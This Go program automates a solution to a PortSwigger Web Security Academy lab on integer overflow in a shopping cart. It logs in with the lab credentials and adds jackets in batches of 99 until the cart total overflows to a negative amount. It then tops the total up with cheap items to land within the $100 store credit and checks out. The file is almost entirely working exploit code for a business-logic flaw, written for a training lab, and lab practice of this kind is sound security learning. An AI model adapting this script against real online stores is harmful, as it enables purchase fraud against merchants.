package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

const (
	LAB_URL       = "https://0a6600e1036e3d348040769200b20053.web-security-academy.net"
	USERNAME      = "wiener"
	PASSWORD      = "peter"
	JACKET_ID     = "1"
	CHEAP_ITEM_ID = "2" // will auto-detect cheapest item
	STORE_CREDIT  = 10000 // $100.00 in cents
)

func main() {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // follow redirects
		},
	}

	fmt.Println("[*] Step 1: Logging in...")
	login(client)

	fmt.Println("[*] Step 2: Overflowing cart with jacket batches (qty=99)...")
	overflowCart(client)

	fmt.Println("[*] Step 3: Fine-tuning total with cheap items...")
	fineTune(client)

	fmt.Println("[*] Step 4: Placing order...")
	checkout(client)
}

// Login functionality
func login(client *http.Client) {
	csrf := getCSRFToken(client, LAB_URL+"/login")
	fmt.Printf("    CSRF: %s\n", csrf)

	resp, err := client.PostForm(LAB_URL+"/login", url.Values{
		"username": {USERNAME},
		"password": {PASSWORD},
		"csrf":     {csrf},
	})
	check(err)
	defer resp.Body.Close()
	io.ReadAll(resp.Body)
	fmt.Println("    [+] Logged in")
}


// overflow Functionality
func overflowCart(client *http.Client) {
	for i := 1; i <= 400; i++ {
		addToCart(client, JACKET_ID, "99")

		// Check every 5 batches to reduce requests
		if i%5 != 0 {
			continue
		}

		raw := getRawCartBody(client)
		total, overflow := parseCartTotal(raw)

		fmt.Printf("    Batch %d | raw total string detected | cents=%d overflow=%v\n",
			i, total, overflow)

		if overflow || total < 0 {
			fmt.Printf("    [+] Integer overflow triggered at batch %d! total=%d ($%.2f)\n",
				i, total, float64(total)/100)
			return
		}
	}
	log.Fatal("[-] Overflow not achieved after 400 batches")
}



// Fine-tuning total with cheap items
func fineTune(client *http.Client) {
	// Use the cheapest product - try product IDs 2,3,4,5
	cheapID, cheapPrice := findCheapItem(client)
	fmt.Printf("    [*] Using item ID=%s price=%d cents ($%.2f) for fine-tuning\n",
		cheapID, cheapPrice, float64(cheapPrice)/100)

	for attempt := 0; attempt < 500; attempt++ {
		raw := getRawCartBody(client)
		total, _ := parseCartTotal(raw)
		fmt.Printf("    [~] total = %d cents ($%.2f)\n", total, float64(total)/100)

		if total >= 0 && total <= STORE_CREDIT {
			fmt.Printf("    [+] Total is within budget: $%.2f\n", float64(total)/100)
			return
		}

		if total > STORE_CREDIT {
			log.Fatalf("Total $%.2f exceeds store credit — need more overflow", float64(total)/100)
		}

		// total is negative, add cheap items to nudge upward
		// We need: total + (qty * cheapPrice) to land in [0, STORE_CREDIT]
		gap := int64(STORE_CREDIT) - total // how many cents we still need
		qty := gap / cheapPrice
		if qty < 1 {
			qty = 1
		}
		if qty > 99 {
			qty = 99
		}
		fmt.Printf("    [*] Adding %d x item %s to raise total by ~%d cents\n",
			qty, cheapID, qty*cheapPrice)
		addToCart(client, cheapID, strconv.Itoa(int(qty)))
	}
	log.Fatal("fineTune: could not get total into budget after 500 attempts")
}

func checkout(client *http.Client) {
	csrf := getCSRFToken(client, LAB_URL+"/cart")
	resp, err := client.PostForm(LAB_URL+"/cart/checkout", url.Values{
		"csrf": {csrf},
	})
	check(err)
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	s := string(body)

	if strings.Contains(s, "Your order is on its way") ||
		strings.Contains(s, "Congratulations") ||
		strings.Contains(s, "order-confirmation") ||
		strings.Contains(s, "Order confirmed") {
		fmt.Println("\n[+] LAB SOLVED! Jacket purchased successfully!")
	} else {
		end := 1200
		if len(s) < end {
			end = len(s)
		}
		fmt.Printf("[!] Unexpected checkout response (HTTP %d):\n%s\n", resp.StatusCode, s[:end])
	}
}

// parseCartTotal handles normal prices like $1337.00 and
// negative/overflowed prices like -$21474836.48 or -21474836.48
func parseCartTotal(body string) (int64, bool) {
	// Try to find the Total line — covers negative with minus before or after $
	// Patterns seen in PortSwigger labs:
	//   Total: $1337.00
	//   Total: -$21474836.48
	//   Total: $-21474836.48
	patterns := []string{
		`[Tt]otal[^$\-\d]*(-?\$-?[\d,]+\.[\d]{2})`,
		`[Tt]otal[^$\-\d]*(\$?-[\d,]+\.[\d]{2})`,
		`[Tt]otal[^$\-\d]*(\$[\d,]+\.[\d]{2})`,
	}

	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(body)
		if len(m) >= 2 {
			v := m[1]
			// Strip $ signs, keep minus
			v = strings.ReplaceAll(v, "$", "")
			v = strings.ReplaceAll(v, ",", "")
			f, err := strconv.ParseFloat(v, 64)
			if err == nil {
				cents := int64(f * 100)
				return cents, cents < 0
			}
		}
	}

	// Fallback: dump a snippet for debugging
	idx := strings.Index(strings.ToLower(body), "total")
	if idx >= 0 {
		end := idx + 80
		if end > len(body) {
			end = len(body)
		}
		fmt.Printf("    [DEBUG] Total area in HTML: %q\n", body[idx:end])
	}
	return 0, false
}

func getRawCartBody(client *http.Client) string {
	resp, err := client.Get(LAB_URL + "/cart")
	check(err)
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func findCheapItem(client *http.Client) (string, int64) {
	// Try product IDs 2–6, return cheapest
	bestID := "2"
	var bestPrice int64 = 999999999

	for _, id := range []string{"2", "3", "4", "5", "6"} {
		resp, err := client.Get(LAB_URL + "/product?productId=" + id)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		price := parseFirstPrice(string(b))
		if price > 0 && price < bestPrice {
			bestPrice = price
			bestID = id
		}
	}
	if bestPrice == 999999999 {
		bestPrice = 500 // fallback $5.00
	}
	return bestID, bestPrice
}

func parseFirstPrice(body string) int64 {
	re := regexp.MustCompile(`\$([0-9,]+\.[0-9]{2})`)
	m := re.FindStringSubmatch(body)
	if len(m) < 2 {
		return 0
	}
	s := strings.ReplaceAll(m[1], ",", "")
	f, _ := strconv.ParseFloat(s, 64)
	return int64(f * 100)
}

func addToCart(client *http.Client, productID, qty string) {
	resp, err := client.PostForm(LAB_URL+"/cart", url.Values{
		"productId": {productID},
		"quantity":  {qty},
		"redir":     {"PRODUCT"},
	})
	check(err)
	resp.Body.Close()
}

func getCSRFToken(client *http.Client, pageURL string) string {
	resp, err := client.Get(pageURL)
	check(err)
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	re := regexp.MustCompile(`name="csrf"\s+value="([^"]+)"`)
	m := re.FindStringSubmatch(string(body))
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}